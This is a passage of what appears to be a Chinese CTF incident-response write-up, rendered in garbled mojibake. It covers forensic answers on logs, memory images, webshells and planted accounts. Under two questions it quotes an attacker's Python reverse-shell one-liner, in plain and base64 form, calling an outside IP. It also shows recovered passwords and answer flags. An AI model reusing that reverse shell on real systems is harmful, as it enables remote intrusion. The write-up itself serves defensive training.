title="åº”æ€¥å“åº”-10"></a>åº”æ€¥å“åº”-10</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤ç¬¬ä¸€æ¬¡æ‰«æå™¨ä½¿ç”¨æ—¶é—´ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[2024/00/00/00:00:00]</p><p>è¿™é‡Œç¬¬ä¸€æ¬¡æ‰«æå™¨çš„æ—¶é—´ï¼Œæ„Ÿè§‰æ˜¯<br> 2024/04/17 08:59:18</p><p> 2024/04/17 08:59:00<br>è¿™ä¸¤ä¸ªï¼Œä¸ºä»€ä¹ˆå‘¢</p><table><thead><tr><th>./fscan -h 192.168.20.0/24</th><th>æ¥å—</th><th>Administrator(admin)</th><th>192.168.1.4</th><th>WebServer(192.168.20.121)</th><th>home(home)</th><th>è½¬åˆ°</th><th>2024/04/17 08:59:18</th></tr></thead><tbody><tr><td>`$ ./fscan  -h 192.168.20.0/24 ./fscan  -h 192.168.20.0/24   ___                              _      / _ \     ___  ___ _ __ __ _  ___</td><td></td><td>__  / /<em>/</em>___/ __</td><td>/ __</td><td>â€˜__/ _<code> |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.3 start infoscan (icmp) Target 192.168.20.121  is alive (icmp) Target 192.168.20.2    is alive (icmp) Target 192.168.20.1    is alive (icmp) Target 192.168.20.11   is alive (icmp) Target 192.168.20.51   is alive (icmp) Target 192.168.20.52   is alive (icmp) Target 192.168.20.123  is alive [*] Icmp alive hosts len is: 7</code></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>./fscan</th><th>æ¥å—</th><th>Administrator(admin)</th><th>192.168.1.4</th><th>WebServer(192.168.20.121)</th><th>home(home)</th><th>è½¬åˆ°</th><th>2024/04/17 08:59:00</th></tr></thead><tbody><tr><td>`$ ./fscan ./fscan    ___                              _      / _ \     ___  ___ _ __ __ _  ___</td><td></td><td>__  / /<em>/</em>___/ __</td><td>/ __</td><td>â€˜__/ _<code> |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     \____/     |___/\___|_|  \__,_|\___|_|\_\                    fscan version: 1.8.3 Host is none Usage of ./fscan:  -br int Brute threads (default 1)  -c string exec command (ssh|wmiexec)  -cookie string set poc cookie,-cookie rememberMe=login  -debug int every time to LogErr (default 60)  -dns using dnslo...c  -domain string smb domain  -full</code></td><td></td><td></td><td></td></tr></tbody></table><p>00é‚£ä¸ªæ˜¯æ‰§è¡Œäº†fscanï¼Œ19é‚£ä¸ªæ˜¯æ‰«äº†ï¼Œä¸çŸ¥é“æ˜¯å“ªä¸€ä¸ªï¼Œä¹Ÿæœ‰å¯èƒ½å°±ä¸æ˜¯fscanè¿™ä¸ªæ‰«æå™¨ï¼Œæ˜¯wafé‚£è¾¹çš„ï¼Œä½†æ˜¯ä¹Ÿä¸æ˜¯ï¼Œå›å¤´çœ‹çœ‹wp</p><p>æœç„¶ï¼Œä¸æ˜¯è¿™ä¸ªfscançš„ï¼Œæ˜¯flaskçš„æ—¥å¿—</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111931975.png" alt="image-20240422111931975"></p><p>19ç»“å°¾å°±æ˜¯ï¼Œç®—ä¸€ä¸‹</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422112133952.png" alt="image-20240422112133952"></p><blockquote><p>flag:[2024/04/15/02:26:59]</p></blockquote><h2 id="åº”æ€¥å“åº”-11"><a href="#åº”æ€¥å“åº”-11" class="headerlink" title="åº”æ€¥å“åº”-11"></a>åº”æ€¥å“åº”-11</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…åå¼¹shellä½¿ç”¨çš„è¯­è¨€ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(c++&amp;java)]å‡ä¸ºå°å†™</p><p>å¾€ä¸‹æ»‘ï¼Œpythonçš„</p><p>1713120249.5091295â€”â€“import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€˜82.157.238.174â€™,7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(â€˜shâ€™)<br>1713120301.6446397â€”â€“pcntl_exec(â€˜/usr/bin/pythonâ€™,[â€˜-câ€™,base64_decode(â€˜aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjgyLjE1Ny4yMzguMTc0Iiw3ODkwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKQ==â€™)]);</p><blockquote><p>flag:python</p></blockquote><h2 id="åº”æ€¥å“åº”-12"><a href="#åº”æ€¥å“åº”-12" class="headerlink" title="åº”æ€¥å“åº”-12"></a>åº”æ€¥å“åº”-12</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…åå¼¹shellçš„ipã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx.xxx.xxx.xxx]</p><p>è§£ä¸€ä¸‹base64<br>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ82.157.238.174â€,7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(â€œshâ€)</p><blockquote><p>flag:82.157.238.174</p></blockquote><h2 id="åº”æ€¥å“åº”-13"><a href="#åº”æ€¥å“åº”-13" class="headerlink" title="åº”æ€¥å“åº”-13"></a>åº”æ€¥å“åº”-13</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…ç•™ä¸‹çš„è´¦å·ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxxx]</p><p>æ”»å‡»è€…çš„è´¦å·å·²ç»çœ‹åˆ°äº†ï¼Œå°±æ˜¯palu.com</p><blockquote><p>flag:palu.com</p></blockquote><h2 id="åº”æ€¥å“åº”-14"><a href="#åº”æ€¥å“åº”-14" class="headerlink" title="åº”æ€¥å“åº”-14"></a>åº”æ€¥å“åº”-14</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…çš„åé—¨è´¦æˆ·å¯†ç ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(password)]</p><p>å¯†ç è¿™é‡Œå·²ç»çŸ¥é“äº†ï¼Œæˆ‘ç”¨hashcatæ²¡æœ‰è·‘å‡ºæ¥ï¼Œjohnå‡ºæ¥çš„</p><blockquote><p>123123</p></blockquote><h2 id="åº”æ€¥å“åº”-15"><a href="#åº”æ€¥å“åº”-15" class="headerlink" title="åº”æ€¥å“åº”-15"></a>åº”æ€¥å“åº”-15</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æµ‹è¯•æ•°æ®æ¡æ•°ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(xxx)]</p><p>è¿™é‡Œæµ‹è¯•æ•°æ®ç«Ÿç„¶æ˜¯æ³¨å†Œçš„æ•°æ®ï¼Œè£‚å¼€ï¼Œäº¤ä»£çš„ä¸æ¸…æ¥š<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422140416744.png" alt="image-20240422140416744"></p><blockquote><p>flag:5</p></blockquote><h2 id="åº”æ€¥å“åº”-16"><a href="#åº”æ€¥å“åº”-16" class="headerlink" title="åº”æ€¥å“åº”-16"></a>åº”æ€¥å“åº”-16</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤æ”»å‡»è€…ç•™ä¸‹çš„ä¿¡æ¯ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>flag{xxx}</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422103647429.png" alt="image-20240422103647429"></p><p>æˆ‘ä»¬æœvimçš„è¯ï¼Œæœ‰ä¸€ä¸ªhacktextï¼Œ<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104039978.png" alt="image-20240422104039978"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104107182.png" alt="image-20240422104107182"></p><blockquote><p>flag:flag{hi_palu_f10g}</p></blockquote><h2 id="åº”æ€¥å“åº”-17"><a href="#åº”æ€¥å“åº”-17" class="headerlink" title="åº”æ€¥å“åº”-17"></a>åº”æ€¥å“åº”-17</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤è¿ç»´æœåŠ¡å™¨ä¸Šçš„æ¶æ„æ–‡ä»¶md5ï¼ˆå°å†™32ä½md5å€¼ï¼‰ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>jumpä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œå¾ˆå°‘ï¼Œ<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104508097.png" alt="image-20240422104508097"></p><p>æœ‰ä¸ªhelloworld<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104629194.png" alt="image-20240422104629194"></p><blockquote><p>0fca0f847a45401c878d7a5303ddc1f8</p></blockquote><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104730373.png" alt="image-20240422104730373"></p><h2 id="åº”æ€¥å“åº”-18"><a href="#åº”æ€¥å“åº”-18" class="headerlink" title="åº”æ€¥å“åº”-18"></a>åº”æ€¥å“åº”-18</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ¶æ„æ–‡ä»¶çš„æ¶æ„å‡½æ•°ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(æ¶æ„å‡½æ•°)]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422105456764.png" alt="image-20240422105456764"></p><p>sftpä¸å¥½ç”¨ï¼Œç›´æ¥pythonå¼€ä¸€ä¸ªä¸‹è½½ä¸€ä¸‹<br>æ‰˜idaçœ‹ä¸€ä¸‹ï¼Œ<img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422105643050.png" alt="image-20240422105643050"> begingame()</p><blockquote><p>flag:ddd0599cda1fc289a617db148d75383b</p></blockquote><h2 id="åº”æ€¥å“åº”-19"><a href="#åº”æ€¥å“åº”-19" class="headerlink" title="åº”æ€¥å“åº”-19"></a>åº”æ€¥å“åº”-19</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤æ”»å‡»è€…æ¶æ„æ³¨å†Œçš„æ¶æ„ç”¨æˆ·æ¡æ•°ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[md5(x)]</p><p>æ ¹æ®æ–‡ä»¶æ‰¾åˆ°æ•°æ®åº“ä¸ºmysql01ï¼Œselect * from pre_ucenter_members ;</p><p>æŸ¥ä¸€ä¸‹ç”¨æˆ·ï¼Œæ˜¯kongziçš„è¿™äº›<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422141428970.png" alt="image-20240422141428970"></p><blockquote><p>flag : 10</p></blockquote><h2 id="åº”æ€¥å“åº”-20"><a href="#åº”æ€¥å“åº”-20" class="headerlink" title="åº”æ€¥å“åº”-20"></a>åº”æ€¥å“åº”-20</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤å¯¹åšå®¢ç³»ç»Ÿçš„ç¬¬ä¸€æ¬¡æ‰«ææ—¶é—´ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[2024/00/00/00:00:00]</p><p>åšå®¢çš„æ˜ å°„ç«¯å£ä¸º80ï¼Œ</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422110228519.png" alt="image-20240422110228519"></p><p>ç­›é€‰ä¸€ä¸‹ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æ‰«æçš„æ—¥å¿—ï¼Œ<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422110536928.png" alt="image-20240422110536928"></p><p>wæ”»å‡»äº‹ä»¶ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œæ‹¦æˆªäº†3.6k,å°±æ˜¯æ‰«æäº†ï¼Œå…¶ä»–çš„ä¹Ÿæœ‰ä¸€äº›æ‰«æï¼Œä½†ä¸æ˜¯åœ¨blogçš„ã€‚</p><blockquote><p>2024-04-16 21:03:46</p></blockquote><h2 id="åº”æ€¥å“åº”-21"><a href="#åº”æ€¥å“åº”-21" class="headerlink" title="åº”æ€¥å“åº”-21"></a>åº”æ€¥å“åº”-21</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ”»å‡»è€…ä¸‹è½½çš„æ–‡ä»¶ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx.xxx]</p><p>åœ¨htmlç›®å½•ä¸‹æœ‰ä¸€ä¸ªupload.zipï¼Œæ—¥å¿—ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°</p><blockquote><p>flag:upload.zip</p></blockquote><h2 id="åº”æ€¥å“åº”-22"><a href="#åº”æ€¥å“åº”-22" class="headerlink" title="åº”æ€¥å“åº”-22"></a>åº”æ€¥å“åº”-22</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤æ”»å‡»è€…ç¬¬ä¸€æ¬¡ä¸‹è½½æœåŠ¡å™¨æ–‡ä»¶çš„æ—¶é—´ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xx/Apr/2024:xx:xx:xx]</p><p>[2024/04/16/21:03:46]</p><p>æˆ‘ä»¬å°†access5çš„æ—¥å¿—ä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142210985.png" alt="image-20240422142210985"></p><p>ç„¶åæœä¸€ä¸‹uploadã€‚zip<br>192.168.20.121:80 192.168.20.123 - - [16/Apr/2024:09:03:52 -0400] â€œGET /upload.zip HTTP/1.1â€ 206 8387 â€œ-â€œ â€œMozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0â€</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142301560.png" alt="image-20240422142301560"></p><blockquote><p>flag:[16/Apr/2024:09:03:52]</p></blockquote><h2 id="åº”æ€¥å“åº”-23"><a href="#åº”æ€¥å“åº”-23" class="headerlink" title="åº”æ€¥å“åº”-23"></a>åº”æ€¥å“åº”-23</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤æ”»å‡»è€…ç•™ä¸‹çš„å†°èé©¬çš„æ–‡ä»¶åç§°ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]<br>ç­›é€‰ä¸€ä¸‹æ—¶é—´ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ª</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111019091.png" alt="image-20240422111019091"></p><p>jumpé‡Œé¢ä¹Ÿæœ‰</p><blockquote><p>flag:nidewen.php</p></blockquote><h2 id="åº”æ€¥å“åº”-24"><a href="#åº”æ€¥å“åº”-24" class="headerlink" title="åº”æ€¥å“åº”-24"></a>åº”æ€¥å“åº”-24</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤å†°èçš„é“¾æ¥å¯†ç ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111427463.png" alt="image-20240422111427463"></p><p>ç›´æ¥è®©æˆ‘çš„å¥½å¤§å“¥å£ç®—ä¸€ä¸‹,å°±æ˜¯æ–‡ä»¶å</p><blockquote><p>flag:nidewen</p></blockquote><h2 id="åº”æ€¥å“åº”-25"><a href="#åº”æ€¥å“åº”-25" class="headerlink" title="åº”æ€¥å“åº”-25"></a>åº”æ€¥å“åº”-25</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤åŠå…¬åŒºå­˜åœ¨çš„æ¶æ„ç”¨æˆ·åã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142549715.png" alt="image-20240422142549715"></p><p>ä¸Šæ¥å°±å¯ä»¥çœ‹åˆ°ï¼Œ</p><blockquote><p>flag:hacker</p></blockquote><h2 id="åº”æ€¥å“åº”-26"><a href="#åº”æ€¥å“åº”-26" class="headerlink" title="åº”æ€¥å“åº”-26"></a>åº”æ€¥å“åº”-26</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ¶æ„ç”¨æˆ·å¯†ç åˆ°æœŸæ—¶é—´ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[2024/xxx/xxx/xxx:xxx:xxx]</p><p>è¿›å»è¾“å…¥net user hackerå³å¯</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240419144854185.png" alt="image-20240419144854185"></p><blockquote><p>flag: 2024/15/18/21:40:37</p></blockquote><h2 id="åº”æ€¥å“åº”-27"><a href="#åº”æ€¥å“åº”-27" class="headerlink" title="åº”æ€¥å“åº”-27"></a>åº”æ€¥å“åº”-27</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·å¯¹åŠå…¬åŒºç•™å­˜çš„é•œåƒå–è¯å¹¶æŒ‡å‡ºå†…å­˜ç–‘ä¼¼æ¶æ„è¿›ç¨‹ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 pslist</code><br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142930126.png" alt="image-20240422142930126"></p><blockquote><p>.hack.ex</p></blockquote><h2 id="åº”æ€¥å“åº”-28"><a href="#åº”æ€¥å“åº”-28" class="headerlink" title="åº”æ€¥å“åº”-28"></a>åº”æ€¥å“åº”-28</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æŒ‡å‡ºè¯¥å‘˜å·¥ä½¿ç”¨çš„å…¬å¸OAå¹³å°çš„å¯†ç ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>æŸ¥ä¸€ä¸‹passç›¸å…³file</p><p><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 filescan | grep pass</code><br><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e296f20 -D /root/Desktop/</code></p><p>ä¸¤ä¸ªæ–‡ä»¶ï¼Œæå‡ºæ¥<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422143146132.png" alt="image-20240422143146132"></p><p>â”Œâ”€â”€(rootã‰¿bohemian)-[~/Desktop]<br>â””â”€# cat file.None.0xfffffa800ee5d530.dat<br>url: <a href="http://test.oa.com/login.html">http://test.oa.com/login.html</a><br>username: liuling<br>password: liuling7541  </p><blockquote><p>flag:  liuling7541  </p></blockquote><h2 id="åº”æ€¥å“åº”-29"><a href="#åº”æ€¥å“åº”-29" class="headerlink" title="åº”æ€¥å“åº”-29"></a>åº”æ€¥å“åº”-29</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æ”»å‡»è€…ä¼ å…¥ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶å¹¶åšäº†æƒé™ç»´æŒï¼Œè¯·é—®æœ¨é©¬æ–‡ä»¶åæ˜¯ä»€ä¹ˆã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxx]</p><p>æŠ„çš„ï¼Œä¸ä¼šï¼Œæœå‰ªåˆ‡æ¿æœ‰<br>python2 vol.py -f /root/Desktop/raw.raw â€“profile=Win7SP1x64 clipboard<br>Volatility Foundation Volatility Framework 2.6.1<br>Session    WindowStation Format                         Handle Object             Data</p><hr><pre><code>     1 WinSta0       CF_UNICODETEXT               0x4c0397 0xfffff900c1c19c30 C:\Windows\PLA\h4ck3d!     1 WinSta0       CF_TEXT                          0x10 ------------------     1 WinSta0       0x1b01a5L              0x300000000000 ------------------     1 WinSta0       CF_TEXT                           0x1 ------------------     1 ------------- ------------------           0x1b01a5 0xfffff900c1cb2b60</code></pre><blockquote><p>flag:h4ck3d!</p></blockquote><h2 id="åº”æ€¥å“åº”-30"><a href="#åº”æ€¥å“åº”-30" class="headerlink" title="åº”æ€¥å“åº”-30"></a>åº”æ€¥å“åº”-30</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤è¯¥è®¡ç®—æœºä¸­è®°å½•çš„é‡è¦è”ç³»äººçš„å®¶åº­ä½å€ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxxx]</p><p>æŠ„çš„ï¼Œç¬¬ä¸€æ¬¡çŸ¥é“</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145239118.png" alt="image-20240422145239118"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145259333.png" alt="image-20240422145259333"></p><p>é‚£ä¹ˆæå–ï¼Œ<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145505782.png" alt="image-20240422145505782"></p><p>â”€# cat /root/Deskt941e0f06â€&gt;&lt;c:Street&gt;ç§‹æ°´çœé›è¡å¸‚ç¢§æ³¢åŒºåƒå±¿å±±åº„1å·&lt;/c:Stree</p><blockquote><p>flag:ç§‹æ°´çœé›è¡å¸‚ç¢§æ³¢åŒºåƒå±¿å±±åº„1å·</p></blockquote><h2 id="åº”æ€¥å“åº”-31"><a href="#åº”æ€¥å“åº”-31" class="headerlink" title="åº”æ€¥å“åº”-31"></a>åº”æ€¥å“åº”-31</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>è¯·æäº¤è¿‘æºé¶æœºä¸Šçš„æ¶æ„æ–‡ä»¶å“ˆå¸Œã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxx]</p><p>è¿‘æºé¶æœºä¸ºpc2,ä¸Šé¢æœ‰ä¸ªæ¶æ„æ–‡ä»¶ï¼Œæ‰“å¼€å°±æ˜¯<br>PS C:\Users\Administrator\Desktop\artifact&gt; certutil -hashfile .\artifact.exe md5<br>MD5 çš„ .\artifact.exe å“ˆå¸Œ:<br>a7fcd0b15a080167c4c2f05063802a6e<br>CertUtil: -hashfile å‘½ä»¤æˆåŠŸå®Œæˆã€‚<br>PS C:\Users\Administrator\Desktop\artifact&gt;</p><blockquote><p>flag a7fcd0b15a080167c4c2f05063802a6e</p></blockquote><h2 id="åº”æ€¥å“åº”-32"><a href="#åº”æ€¥å“åº”-32" class="headerlink" title="åº”æ€¥å“åº”-32"></a>åº”æ€¥å“åº”-32</h2><p><strong>é¢˜ç›®è¦æ±‚ï¼š</strong><br>æäº¤æ¶æ„ç¨‹åºçš„å¤–è”åœ°å€ã€‚</p><hr><p><strong>æäº¤æ ¼å¼ï¼š</strong><br>[xxxxx]</p><p>è¿™ä¸ªæ‹–åˆ°å¾®æ­¥ï¼Œæ²¡æœ‰æ£€æµ‹åˆ°å¤–è¿</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422151054884.png" alt="image-20240422151054884"><img 